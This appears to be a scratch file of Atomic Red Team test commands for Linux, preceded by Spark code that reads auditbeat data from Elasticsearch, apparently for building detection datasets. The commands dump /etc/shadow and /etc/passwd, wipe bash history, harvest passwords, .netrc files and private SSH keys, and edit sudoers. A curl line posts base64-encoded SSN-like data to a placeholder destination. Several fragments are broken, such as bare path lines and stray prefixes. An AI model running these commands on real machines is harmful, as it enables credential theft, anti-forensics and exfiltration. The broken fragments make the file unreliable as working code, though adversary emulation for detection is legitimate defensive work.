$val elasticIndex = "auditbeat-*/doc"
$val url = "localhost:9200"
$val reader = sqlContext.read.format("org.elasticsearch.spark.sql").option("es.nodes",url)



#Atomic Test $1 - Access /etc/shadow (Local)
output_file="/home/user/bits/datasetup/simulator/T1003.008.txt"

sudo cat /etc/shadow > ${output_file}
cat ${output_file}
rm -f ${output_file}


#Atomic Test $2 - Access /etc/passwd (Local)

cat /etc/passwd > ${output_file}
cat ${output_file}
rm -f ${output_file}


#Atomic Test $3 - Access /etc/{shadow,passwd} with a standard bin that's not cat
echo -e "e /etc/passwd\n,p\ne /etc/shadow\n,p\n" | ed > ${output_file}
rm -f ${output_file}


#Atomic Test $1 - Clear Bash history (rm)
rm ~/.bash_history

#Atomic Test $2 - Clear Bash history (echo)
echo "" > ~/.bash_history

#Atomic Test $3 - Clear Bash history (cat dev/null)
cat /dev/null > ~/.bash_history



#Atomic Test $2 - Extract passwords with grep
grep -ri password ${file_path}


#Atomic Test $5 - Find and Access Github Credentials
for file in $(find / -name .netrc 2> /dev/null);do echo $file ; cat $file ; done




#Atomic Test $2 - Discover Private SSH Keys
/tmp/keyfile_locations.txt
find ${search_path} -name id_rsa >> ${output_file}
rm ${output_file}

#Atomic Test $3 - Copy Private SSH Keys with CP
/tmp/art-staging
mkdir ${output_folder}
find ${search_path} -name id_rsa -exec cp --parents {} ${output_folder} \;
rm ${output_folder}


#Atomic Test $1 - Sudo usage
sudo -l      
sudo cat /etc/sudoers
sudo vim /etc/sudoers


#Atomic Test $1 - chmod - Change file or folder mode (numeric mode)
/tmp/AtomicRedTeam/atomics/T1222.002

chmod ${numeric_mode} ${file_or_folder}


#Atomic Test $1 - Base64 Encoded data.
echo -n 111-11-1111 | base64
curl -XPOST ${base64_data}.${destination_url}


cat /etc/pam.d/system-auth
cat /etc/security/pwquality.conf

cat /etc/login.defs


#Atomic Test $1 - Enumerate all accounts (Local)

/tmp/T1087.001.txt

cat /etc/passwd > ${output_file}
cat ${output_file}

rm -f ${output_file}


#Atomic Test $2 - View sudoers access

sudo cat /etc/sudoers > ${output_file}
cat ${output_file}

rm -f ${output_file}


username=$(id -u -n) && lsof -u $username


#Atomic Test $5 - Show if a user account has ever logged in remotely

lastlog > ${output_file}
cat ${output_file}
rm -f ${output_file}


